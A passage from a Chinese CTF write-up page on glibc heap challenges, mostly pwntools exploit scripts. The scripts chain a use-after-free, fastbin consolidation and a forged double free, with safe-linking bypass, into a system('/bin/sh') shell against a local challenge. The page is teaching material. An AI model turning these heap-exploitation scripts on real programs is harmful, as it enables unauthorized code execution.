edit<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x1ecb70</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xe3b01</span><span class="token operator">+</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ptmalloc2-its-myheap" tabindex="-1"><a class="header-anchor" href="#ptmalloc2-its-myheap" aria-hidden="true">#</a> ptmalloc2_its_myheap</h2><blockquote><p>这题利用的一个<code>head chunk</code>进行记录信息 然后一个<code>content chunk</code>记录内容 而且没有对<code>content chunk</code>的size进行限制</p><p>并且最重要的是在free的时候没有对chunk指针进行清空 这样我们可以实现uaf</p><p>输出chunk内容的时候也是根据我们输入的size来进行输出的 所以可以泄露大量信息</p><p>有一个gift函数 输出了libc地址 我们可以直接劫持gift函数和hello_world字符串来实现getshell</p></blockquote><h3 id="劫持head-chunk" tabindex="-1"><a class="header-anchor" href="#劫持head-chunk" aria-hidden="true">#</a> 劫持head chunk</h3><blockquote><p>由于信息都是通过<code>head chunk</code>进行的记录 所以我们直接劫持<code>head chunk</code>就可以实现任意free了 因为在free <code>head chunk</code>的时候会同步free <code>head chunk</code>记录的buf指针 我们劫持<code>head chunk</code>就可以任意修改buf指针完成任意free 这样我们可以轻松构造一个double free 实现任意写操作</p></blockquote><ul><li><p>触发fastbin的合并</p><ul><li>我们可以让<code>head chunk</code>进入fastbin链中 然后通过申请一个largebin chunk触发合并机制 然后让这些chunk合并进入unsortedbin 我们再申请为 <code>content chunk</code>这样我们可以对这些原本的head chunk进行劫持</li></ul></li><li><p>构造double free</p><ul><li>任意free 让fastbin链中第二个chunk free来触发double free 劫持bss段数据</li></ul></li></ul><h3 id="脚本-2" tabindex="-1"><a class="header-anchor" href="#脚本-2" aria-hidden="true">#</a> 脚本</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
<span class="token comment"># context.terminal = [&#39;byobu&#39;, &#39;sp&#39;, &#39;-h&#39;]</span>


<span class="token comment"># file_name = &quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">64814</span>

<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *main+34&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk size: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk data: &quot;</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;----------\\n添加index为:</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">的chunk\\n----------&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk id: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;----------\\n删除index为</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">的chunk\\n----------&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk id: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res
<span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;114514&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">b&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span>  <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;非预期数据&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token comment"># fastbin 的合并机制需要 在申请large chunk时</span>

<span class="token comment"># 创建unsortedbin大小占满 并且多两个chunk</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 0x110大小chunk 8号就是我们要修改的chunk</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>


<span class="token comment"># 此时index为6的获取了 各个链的chunk</span>
add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;获取一个大chunk装了heap&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
addr_slice <span class="token operator">=</span> getData<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
<span class="token comment"># 0xae4400 - 0xae4000   0x1baf400</span>
base_heap <span class="token operator">=</span> addr_slice<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x400</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># x/10a &amp;chunk_list 前6号占满 但是前五个isused为0</span>

<span class="token comment"># 开始构造double free 先是取回所有的tcache 再占满tcache</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 此时fastbin有三个 tcache占满 我们malloc一个巨无霸然后就可以覆写fastbin fastbin情况:0xacf8e0 —▸ 0xacf8c0 —▸ 0xacf8a0 ◂— 0x0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;占满tcache&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># chunk_list[4] 对应 这里paload偏移32位置</span>
<span class="token comment"># 此时chunk_list使用情况: 6 7 处于使用状态</span>
<span class="token comment"># 如果free则是free chunk_list[4] 所以我们要构造好这个chunk 让它绕过安全检测 所以我们构造size和prev_inuse位 然后再构造里面的fd让它指向fastbin chunk中第二个chunk</span>
fakechunk <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x31</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;prev_size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
<span class="token comment"># 这里随意</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;chunk_list_size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x20</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;isUsed&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token comment"># 看下面的解释</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">0xd10</span>
<span class="token comment"># 要free的是:0x1279d00 链子:0x1279d20 —▸ 0x1279d00 变成:0x1279d00 —▸ 0x1279d20 ◂— 0x1279d00</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x430</span><span class="token punctuation">,</span><span class="token string">b&quot;aaaaaaaa&quot;</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;prev_size&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;chunk_list_size&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;isUsed&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;成功构造fake chunk \\ndouble free 的chunk指针:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 构造两个fastbin的情况</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># fastbin:0x1603d20 —▸ 0x1603d00 heapbase:0x1603000 所以构造一个0x1603d00被free的情况</span>
<span class="token comment"># 然后glibc 2.35版本下有fd加密 需要:堆地址&gt;&gt;12然后 ^我想要构造的fd</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;构造成功两个fastbin的情况&quot;</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">&gt;&gt;</span><span class="token number">12</span><span class="token operator">^</span><span class="token number">0x404070</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> gift<span class="token punctuation">(</span><span class="token punctuation">)</span>

base_libc <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">0x80E50</span>
system_addr <span class="token operator">=</span> base_libc <span class="token operator">+</span><span class="token number">0x50D70</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
gift<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ptmalloc2-it-s-myheap-pro-glibc2-35下的exit函数打法" tabindex="-1"><a class="header-anchor" href="#ptmalloc2-it-s-myheap-pro-glibc2-35下的exit函数打法" aria-hidden="true">#</a> ptmalloc2 it&#39;s myheap pro (glibc2.35下的exit函数打法)</h2><h3 id="审题" tabindex="-1"><a class="header-anchor" href="#审题" aria-hidden="true">#</a> 审题</h3><ul><li><p>add函数 malloc一个0x18的chunk(0x20) 属性分别对应:size isUsed buff 并且仅在创建的时候可以写入数据 并且没有检测这个index是否在使用 所以我们可以对一个index无限malloc</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418005442527.png" alt="image-20240418005442527" tabindex="0" loading="lazy"><figcaption>image-20240418005442527</figcaption></figure></li><li><p>delete函数 直接free记录信息的chunk和我们的内容体chunk(buff) 并且没有清空</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418005502800.png" alt="image-20240418005502800" tabindex="0" loading="lazy"><figcaption>image-20240418005502800</figcaption></figure></li><li><p>view函数 直接write出size大小的内容 存在泄露</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418005523801.png" alt="image-20240418005523801" tabindex="0" loading="lazy"><figcaption>image-20240418005523801</figcaption></figure></li><li><p>atexit函数</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418131700409.png" alt="image-20240418131700409" tabindex="0" loading="lazy"><figcaption>image-20240418131700409</figcaption></figure></li></ul><h3 id="大致利用原理" tabindex="-1"><a class="header-anchor" href="#大致利用原理" aria-hidden="true">#</a> 大致利用原理:</h3><blockquote><p>这里先粗略写一下原理 后面细讲 整个利用原理不算难但是细节很多很多地方需要微调</p></blockquote>`,30),v=n("li",null,[n("p",null,"泄露libc heap地址"),n("ul",null,[n("li",null,"通过malloc 9个128 来申请0x90大小的chunk 然后free掉 让chunk进入unsortedbin中 再申请回来 通过write函数直接泄露libc地址 和heap地址")])],-1),g=n("li",null,[n("p",null,"伪造fake chunk（消耗topchunk触发fastbin的合并）"),n("blockquote",null,[n("p",null,"或者通过向scanf输入大量数据触发fastbin合并 因为scanf在接受大量数据的时候会申请一个largebin")]),n("ul",null,[n("li",null,[s("因为题目中存在isUsed 有了这个就阻止了我们"),n("code",null,"double free"),s("所以我们让记录头信息的chunk进入fastbin中 并且通过消耗空topchunk 触发fastbin的合并机制 让fastbin进入unsortedbin中 再通过分割机制 让原本的信息头chunk成为我们的内容chunk(buff) 通过向chunk写入内容来劫持信息头chunk 改写isUsed和buff指针 来实现任意地址的free 从而实现double 